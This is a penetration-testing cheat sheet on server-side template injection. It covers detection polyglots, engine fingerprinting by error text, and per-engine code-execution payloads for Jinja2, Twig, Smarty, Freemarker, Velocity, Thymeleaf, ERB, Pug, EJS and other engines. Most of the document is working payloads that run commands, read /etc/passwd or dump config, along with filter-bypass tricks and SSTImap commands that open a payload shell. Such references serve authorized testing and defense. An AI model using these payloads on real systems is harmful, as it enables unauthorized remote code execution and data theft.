# Ch04 — Server-Side Template Injection (SSTI)

> Detection polyglots, engine fingerprinting, per-engine breakout and code-execution payload families.
> Sources: `Server Side Template Injection/` (README + per-engine files for Jinja2, Twig, Freemarker, Velocity, Mako, ERB, Smarty, Pebble, Jinjava, Tornado, Thymeleaf, Groovy, EL, Blade, Latte, etc.).

**Route here when**: user input is concatenated into a server-side template — `{{7*7}}` renders `49`, `${7*7}` errors or renders, error pages/email/PDF generators reflect input.

**Safety**: detection payloads are inert arithmetic. Escalate only to harmless commands (`id`, `hostname`) — no shells or destructive writes.

## Universal detection

Polyglot that errors on most engines:

```ps1
${{<%[%'"}}%\.
```

Rendered-vs-error probe: arithmetic in the engine's tag delimiters.

```powershell
{{7*7}} ${7*7} #{7*7} <%= 7*7 %> {7*7} {{= 7*7}} {= 7*7} *{7*7} @{7*7} @(7*7)
```

Error-based probe (works inside most tag families):

```powershell
(1/0).zxy.zxy
```

Verbose-error fingerprint:

| Error text | Engine family |
|---|---|
| `ZeroDivisionError` | Python (Jinja2, Mako, Tornado, Django) |
| `java.lang.ArithmeticException` | Java (Freemarker, Velocity, Thymeleaf, Pebble, Jinjava) |
| `ReferenceError` / `TypeError` | NodeJS (Pug, EJS, Nunjucks, Handlebars) |
| `Division by zero` / `DivisionByZeroError` | PHP (Twig, Smarty, Blade, Latte) |
| `divided by 0` | Ruby (ERB, Slim) |
| `Arithmetic operation failed` | Freemarker |

Blind (no output) — boolean pairs inside tags:

```powershell
{{ (3*4/2) }}   vs   {{ 3*)2(/4 }}        // ok vs syntax-error pair
{{ ((7*8)/(2*4)) }} vs {{ 7)(*)8)(2/(*4 }}
```

Time-based blind: engine's sleep/exec function in tags (below), or OOB via HTTP request to your callback.

## Python engines

**Jinja2 / Flask** — object-graph walk to `os.popen` / `subprocess`:

```jinja2
{{7*7}}                                        → 49
{{config}}                                     → app config dump
{{self}} {{request}}                           → object handles
{{''.__class__.__mro__[1].__subclasses__()}}   → all loaded classes
{{''.__class__.__mro__[1].__subclasses__()[IDX]('/etc/passwd').read()}}   // subclass index varies — find file/OS-capable class
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

Filter bypasses: `|attr()` for `.`/`[]` bans, `\x5f` hex for `_` bans, `[]`+`request.args` to smuggle filtered strings, `{{request.args.a}}` with `?a=...` for quote bans, `{{lipsum.__globals__}}` older gadgets.

**Mako**: `${7*7}` → `${'x'.__class__.__mro__[1].__subclasses__()}` then same subclass walk; `<%! import os; x=os.popen('id').read() %>` module-level blocks.

**Tornado**: `{% import os %}{{os.popen('id').read()}}` / `{% raw expression %}`; `{{handler.application.settings}}` for config.

**Django**: `{{settings}}`, `{% load module %}`, debug pages leak settings — SSTI is rare (Django doesn't eval user templates by default) but `{% extends %}`/include tricks read files when the loader path is injectable.

## PHP engines

**Twig**:

```twig
{{7*7}} {{7*'7'}}                        → 49 / 7777777 (string-multiply distinguishes from Jinja2)
{{_self}} {{_self.env}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['id',1]|sort('system')}}            // sort-callback variant
```

**Smarty**:

```smarty
{php}echo `id`;{/php}                  // Smarty <3.1 with security off
{system('id')}
{$smarty.template_object}
{if phpinfo()}{/if}
```

**Blade (Laravel)**: `{{7*7}}`, `{{phpinfo()}}`, `<?php system('id'); ?>` when `{{ }}` compiles to echo of your input... Blade evaluates `{{ }}` as PHP echo — `{{system('id')}}` works when the injected text lands inside `{{ }}`.

**Latte**: `{var $x='id'}{$x|noescape}`, `{php phpinfo()}` macro variants.

## Java engines

**Freemarker**:

```jsp
${7*7} <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")}
```

`?new()` = instantiation — the classic Execute-utility chain is the first escalation to try.

**Velocity**:

```velocity
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

**Thymeleaf / Spring**: `#{...}` is i18n, `${...}` is OGNL-ish SpringEL — RCE via `T(java.lang.Runtime).getRuntime().exec('id')`:

```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x    // preprocessing bypass
```

**Pebble**: `{{''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}` (method invocation enabled by default on older versions).

**Jinjava (HubSpot)**: `{{'a'.toUpperCase()}}` detection → `{{request.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}` style reflection, or `{% %}`/`{# #}` blocks; strict sandbox on newer versions → map/filter tricks.

**Java EL / OGNL / Groovy / MVEL**: `${7*7}`/`#{...}` → `T(java.lang.Runtime)`/`@Runtime@getRuntime().exec()` / `new java.lang.ProcessBuilder('id').start()` variants depending on the expression language.

## Ruby engines

**ERB / ERB-in-Rails**:

```ruby
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= File.open('/etc/passwd').read %>
```

**Slim**: `#{7*7}` detection → `#{'x'`/`#{system('id')}`.

## JavaScript engines (Node)

**Pug/Jade**: `#{7*7}` → `#{root.process.mainModule.require('child_process').execSync('id')}`.

**EJS**: `<%= 7*7 %>` → `<%= process.mainModule.require('child_process').execSync('id').toString() %>`; prototype-pollution gadget alternative — `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('id')"}}`.

**Nunjucks/Handlebars**: `{{range.constructor('return global.process.mainModule.require("child_process").execSync("id")')()}}` via `.constructor.constructor` (Function constructor) on any object.

## CSTI vs SSTI note

`{{7*7}}` rendering `49` inside an `ng-app` scope with no server round-trip = AngularJS CSTI (ch01). Same payload evaluated by the server = SSTI. Distinguish by checking whether the evaluation survives a raw HTTP fetch.

## Automation

```bash
python3 sstimap.py -u 'https://target/page?name=John*' -s        # SSTImap: detect+fingerprint+shell
tinja url -u 'http://target/?name=test' -H 'Auth: Bearer ...'    # TInjA: polyglot scanning incl. CSTI
```

SSTImap `--level`/`-e` forces engine when auto-detect misses; interactive `-i` gives a payload shell.
